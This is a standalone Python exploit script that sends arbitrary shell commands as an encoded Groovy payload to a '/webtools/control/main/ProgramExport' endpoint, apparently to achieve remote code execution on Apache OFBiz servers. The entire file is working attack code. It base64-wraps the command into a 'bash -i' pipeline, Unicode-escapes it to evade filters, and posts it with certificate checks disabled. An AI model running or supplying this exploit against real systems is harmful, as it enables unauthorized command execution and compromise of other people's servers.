import argparse  
import requests  
import base64  

def format_payload(payload: str) -> str:  
    base64_payload = base64.b64encode(payload.encode()).decode()  
    formatted_payload = f"\"bash -c {{echo,{base64_payload}}}|{{base64,-d}}|{{bash,-i}}\".execute()"
    return formatted_payload  

def unicode_encode(payload: str) -> str:  
    unicode_payload = ''.join(f'\\u{ord(c):04X}' for c in payload)  
    return unicode_payload  

def encode_payload(payload: str) -> str:  
    formatted_payload = format_payload(payload)  
    unicode_encoded_payload = unicode_encode(formatted_payload)  
    return unicode_encoded_payload  

def send_payload(url: str, payload: str):  
    try:  
        encoded_payload = encode_payload(payload)  
        post_url = url + '/webtools/control/main/ProgramExport'  
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}  
        post_data = f"groovyProgram={encoded_payload}"
        print(post_data)
        response = requests.post(post_url, data=post_data, headers=headers,verify=False)  
        print(f"Response Status Code: {response.status_code}")  

    except Exception as e:  
        print(f"An error occurred: {e}")  

def main():  
    parser = argparse.ArgumentParser(description="Send payload to specified URL")  
    parser.add_argument("url", type=str, help="The URL to send the payload to")  
    parser.add_argument("payload", type=str, help="The payload to send (string)")  
    
    args = parser.parse_args()  
    
    url = args.url  
    payload = args.payload  
    
    send_payload(url, payload)  

if __name__ == "__main__":  
    main()
